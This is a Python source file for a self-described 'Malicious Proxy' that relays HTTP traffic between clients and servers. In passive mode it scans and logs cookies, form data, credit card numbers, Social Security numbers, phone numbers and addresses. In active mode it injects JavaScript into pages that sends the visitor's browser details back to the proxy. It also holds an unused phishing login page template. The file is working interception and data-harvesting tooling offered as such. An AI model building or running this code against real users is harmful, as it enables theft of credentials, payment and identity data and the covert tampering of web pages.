import argparse
import re
import socket
import threading
from email.parser import BytesParser
import time
from urllib.parse import parse_qs, urlparse
from termcolor import colored, cprint
from pprint import pprint
import nltk
from nltk.corpus import names, gazetteers
import traceback
import chardet

############################################################################################################# Helper Functions
nltk.download('names')
nltk.download('gazetteers')
args = {}
script = b""
phish = b""


################################################## Passive Scan Helpers
def identify_common_thing(input_string, thing):
    # Get a list of common names from the NLTK names dataset
    common_thing = set(thing.words())
        
    input_string = re.split('[^a-zA-Z]', input_string)

    words_in_input = {x for x in input_string}
    common_thing_found = common_thing.intersection(words_in_input)

    if 'Cookie' in common_thing_found:
        common_thing_found.remove('Cookie')

    return common_thing_found

################################################## http Parsing
def get_body(data):    
    result = data.split(b"\r\n\r\n", 1)
    if len(result) == 2:
        header, body = result
    else:
        body = b''

    return str(body, 'utf-8', 'ignore')

def parse_http_headers(data):
    result = data.split(b'\r\n', 1)
    if len(result) == 2:
        request_line, headers_alone = result
        headers = BytesParser().parsebytes(headers_alone)
    else:
        request_line = b''
        headers = {}

    return str(request_line, 'utf-8', 'ignore'), headers

def parse_http_request_line(data):
    request_line, header = parse_http_headers(data)
    method, url, protocol = request_line.split()
    parsed_url = urlparse(url)

    hostname = parsed_url.hostname
    port = parsed_url.port or 80  # Default to port 80

    return method, parsed_url

################################################## recv Fix
def receive_all(sock, length):
    # Helper function to receive all data until a specified length
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return data

def full_receive(socket):
    data = socket.recv(4096)
    
    remaining_data = get_body(data)
    _ , header = parse_http_headers(data)
    content_length = int(header.get('Content-Length') or 0)

    if content_length > len(remaining_data):
        content = receive_all(socket, content_length - len(remaining_data))
        full_response = data + content
    else:
        full_response = data
    
    return full_response

############################################################################################################# Real Stuff

################################################## Passive Mode
def passive_scan(data, packet_type):
    request_line, header = parse_http_headers(data)
    body = get_body(data)
    str_data = str(data, 'utf-8', 'ignore')
    
    intel = {}
    intel["date"] = time.time()

    if packet_type == "request":
        method, parsed_url = parse_http_request_line(data)

        # form parameters
        form_data = parse_qs(parsed_url.query) or parse_qs(body)
        if form_data != {}:
            intel["form-data"] = form_data

    # cookies
    if header["Cookie"] is not None:
        intel["cookies"] = header["Cookie"]

    # cc
    cc_pattern = r'(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})'
    cc_match = re.findall(cc_pattern, str_data) or None
    if cc_match is not None:
        intel["possible_CCs"] = cc_match

    # ssn
    ssn_pattern = r'(\d{3}-\d{2}-\d{4}|XXX-XX-XXXX)'
    ssn_match = re.findall(ssn_pattern, str_data) or None
    if ssn_match is not None:
        intel["possible_SSNs"] = ssn_match

    # phone numbers
    phone_pattern = r'\b\d{3}-\d{3}-\d{4}\b'
    phone_match = re.findall(phone_pattern, str_data) or None
    if phone_match is not None:
        intel["possible_phone #s"] = phone_match

    # zipcode
    zipcode_pattern = r'\b\d{5}(?:-\d{4})?\b'
    zip_match = re.findall(zipcode_pattern, str_data) or None
    if zip_match is not None:
        intel["possible_zipcodes"] = zip_match

    # address
    address_pattern = r'\b(\d+\s*[+\s]+[\w\s]*[+\s](?:Street|St\.?|Avenue|Ave\.?|Boulevard|Blvd\.?|Road|Rd\.?|Lane|Ln\.?|Drive|Dr\.?|Court|Ct\.?|Place|Pl\.?))\b'
    addr_match = [word.replace('+', ' ') for word in re.findall(address_pattern, str_data)] or None
    if addr_match is not None:
        intel["possible_addresses"] = addr_match

    # common names
    common_names = identify_common_thing(str_data, names)
    if len(common_names) > 0:
        intel["possible_names"] = common_names

    # common cities
    locations = identify_common_thing(str_data, gazetteers)
    if len(locations) > 0:
        intel["possible_locations"] = locations

    # only add to info if info was added
    if len(intel) > 1:
        pprint(intel, indent=4, sort_dicts=False)   

        with open('info_1.txt', 'a+') as file:
            pprint(intel, stream=file, indent=4, sort_dicts=False)   

################################################## Active Mode

def active_scan(data, packet_type):
    if packet_type == "request":
        method, parsed_url = parse_http_request_line(data)

        if parsed_url.hostname is None:
            intel = {}
            intel["date"] = time.time()
            intel = parse_qs(parsed_url.query)

            with open('info_2.txt', 'a+') as file:
                pprint(intel, stream=file, indent=4, sort_dicts=False)  


def active_injection(data):
    if b"<body>" in data:
        front, back = data.split(b"<body>", 1)
        injection = front + script + back
    else:
        injection = data
    
    return injection

################################################## Debugging

# observe request packets
def observe_request(request_data, host, port):
    method, parsed_url = parse_http_request_line(request_data)

    print(colored(f"[*] {method} packet from {host}:{port}", "green"))
    if args.listen_mode == 'passive':
        passive_scan(request_data, 'request')
    elif args.listen_mode == 'active':
        # print(request_data)
        active_scan(request_data, 'request')

def observe_response(response_data, host, port):
    request_line, header = parse_http_headers(response_data)

    print(colored(f"[*] {request_line} from {host}:{port}", "red"))
    if args.listen_mode == 'passive':
        passive_scan(response_data, 'response')
    elif args.listen_mode == 'active':
        print(response_data)
        active_scan(response_data, 'response')

################################################## Client Stuff
def handle_client(client_socket, addr):
    client_host, client_port = addr

    # Receive the client's first request
    client_data = client_socket.recv(4096)
    observe_request(client_data, client_host, client_port)

    # Filter the incoming HTTP request
    method, parsed_url = parse_http_request_line(client_data)
    target_hostname, target_port = (parsed_url.hostname, parsed_url.port or 80)

    if method not in ['GET', 'POST'] or target_hostname is None:
        client_socket.close()
        return
    
    # Connect to the target server
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_socket.connect((target_hostname, target_port))

    try:
        while True:
            # send client data
            target_socket.send(client_data)

            # receive target response
            target_data = full_receive(target_socket)
            if target_data == b'':
                break
            else:
                if args.listen_mode == 'active':
                    target_data = active_injection(target_data)
                observe_response(target_data, target_hostname, target_port)


            # send target data
            client_socket.send(target_data)

            # wait for clients response
            client_data = full_receive(client_socket)
            if client_data == b'':
                break
            else:
                if args.listen_mode == 'active':
                    target_data = active_injection(target_data)
                observe_request(client_data, client_host, client_port)
            
        # Close the connections
        client_socket.close()
        target_socket.close()

    except ValueError:
        print('----------------------------------')
        traceback.print_exc()
        print(client_data)
    except Exception:
        # print("error")
        traceback.print_exc()



    
################################################## Start up

def start_proxy(listen_mode, bind_host, bind_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_host, bind_port))

    server.listen(5)
    print(colored(f"[*] Listening on {bind_host}:{bind_port}", 'green'))

    while True:
        client_socket, addr = server.accept()
        print(colored(f"[*] Accepted connection from {addr[0]}:{addr[1]}", 'green'))
        
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

def main():
    global script
    global args
    global phish

    parse = argparse.ArgumentParser(description='Malicious Proxy')

    parse.add_argument("-m", "--listen_mode", default='passive')
    parse.add_argument("bind_host")
    parse.add_argument("bind_port", type=int)

    args = parse.parse_args()
    script = """<script>
            // Get client information
            var userAgent = navigator.userAgent;
            var screenWidth = window.screen.width;
            var screenHeight = window.screen.height;
            var language = navigator.language;

            // Create data object
            var data = {
                user_agent: userAgent,
                screen_width: screenWidth,
                screen_height: screenHeight,
                lang: language
            };

            // Convert data to query parameters
            var queryParams = Object.keys(data).map(function(key) {
                return encodeURIComponent(key) + '=' + encodeURIComponent(data[key]);
            }).join('&');

            // Specify the proxy server URL
            var proxyServerUrl = 'http://""" + f"{args.bind_host}:{args.bind_port}" + """?' + queryParams;
            console.log(proxyServerUrl)

            // Send GET request to the proxy server
            var xhr = new XMLHttpRequest();
            xhr.open('GET', proxyServerUrl, true);
            xhr.send();

            // You can handle the response if needed
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log('Request successful:', xhr.responseText);
                } else {
                    console.error('Request failed:', xhr.statusText);
                }
            };
            </script>"""
    script = script.encode('utf-8')

    phish = """<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login Page</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f4f4;
                    text-align: center;
                    margin-top: 50px;
                }

                .login-container {
                    max-width: 300px;
                    margin: auto;
                    padding: 20px;
                    background-color: white;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    border-radius: 5px;
                }

                .login-container input {
                    width: 100%;
                    padding: 10px;
                    margin: 8px 0;
                    box-sizing: border-box;
                }

                .login-container button {
                    background-color: #4caf50;
                    color: white;
                    padding: 10px 15px;
                    margin: 8px 0;
                    border: none;
                    border-radius: 3px;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Login</h2>
                <form action="/login" method="post">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>

                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>

                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        """

    start_proxy(args.listen_mode, args.bind_host, args.bind_port)



if __name__ == '__main__':
    main()
    